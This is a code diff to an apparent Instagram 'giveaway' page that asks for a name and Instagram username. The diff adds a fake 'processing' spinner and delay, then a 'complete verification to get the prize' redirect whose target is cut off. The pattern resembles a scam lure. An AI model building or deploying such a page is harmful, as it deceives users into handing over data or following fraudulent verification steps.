@@ -83,10 +83,29 @@
             transform: translateY(-2px);
         }
 
-        /* Hidden Verification State */
-        #verificationMenu {
+        /* Spinner CSS */
+        .spinner {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0,0,0,0.1);
+            border-left-color: var(--primary-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Hidden States */
+        #registrationForm, #verificationMenu, #loadingSection {
             display: none;
         }
+
+        /* Default visible state */
+        #registrationForm { display: block; }
 
         .check-icon {
             font-size: 50px;
@@ -102,44 +121,57 @@
 </head>
 <body>
 
-    <div class="card" id="registrationCard">
-        <h2>🎁 Giveaway</h2>
-        <p>Enter your details to participate</p>
+    <div class="card">
         
-        <form id="giveawayForm">
-            <div class="input-group">
-                <label>Full Name</label>
-                <input type="text" id="fullname" placeholder="John Doe" required>
-            </div>
-            
-            <div class="input-group">
-                <label>Instagram Username</label>
-                <input type="text" id="ig_user" placeholder="@yourname" required>
-            </div>
+        <div id="registrationForm">
+            <h2>🎁 Giveaway</h2>
+            <p>Enter your details to participate</p>
+            <form id="giveawayForm">
+                <div class="input-group">
+                    <label>Full Name</label>
+                    <input type="text" id="fullname" placeholder="Your Name" required>
+                </div>
+                <div class="input-group">
+                    <label>Instagram Username</label>
+                    <input type="text" id="ig_user" placeholder="@yourname" required>
+                </div>
+                <button type="submit">Submit Entry</button>
+            </form>
+        </div>
 
-            <button type="submit">Submit Entry</button>
-        </form>
-    </div>
+        <div id="loadingSection">
+            <div class="spinner" style="display:block;"></div>
+            <p>Please wait, processing your entry...</p>
+        </div>
 
-    <div class="card" id="verificationMenu">
-        <div class="check-icon">✓</div>
-        <h2>Almost Done!</h2>
-        <p>Complete verification to get the prize.</p>
-        
-        <button class="btn-verify" onclick="redirectToFinal()">Verify Now</button>
+        <div id="verificationMenu">
+            <div class="check-icon">✓</div>
+            <h2>Almost Done!</h2>
+            <p>Complete verification to get the prize.</p>
+            <button class="btn-verify" onclick="redirectToFinal()">Verify Now</button>
+        </div>
+
     </div>
 
     <script>
-        const form = document.getElementById('giveawayForm');
-        const regCard = document.getElementById('registrationCard');
+        const regForm = document.getElementById('registrationForm');
+        const loading = document.getElementById('loadingSection');
         const verifyMenu = document.getElementById('verificationMenu');
+        const form = document.getElementById('giveawayForm');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Animasi transisi sederhana
-            regCard.style.display = 'none';
-            verifyMenu.style.display = 'block';
+            // 1. Sembunyikan Form
+            regForm.style.display = 'none';
+            // 2. Tampilkan Loading
+            loading.style.display = 'block';
+
+            // 3. Tunggu 2.5 detik, lalu munculkan Menu Verifikasi
+            setTimeout(() => {
+                loading.style.display = 'none';
+                verifyMenu.style.display = 'block';
+            }, 2500); 
         });
 
         function redirectToFinal() {
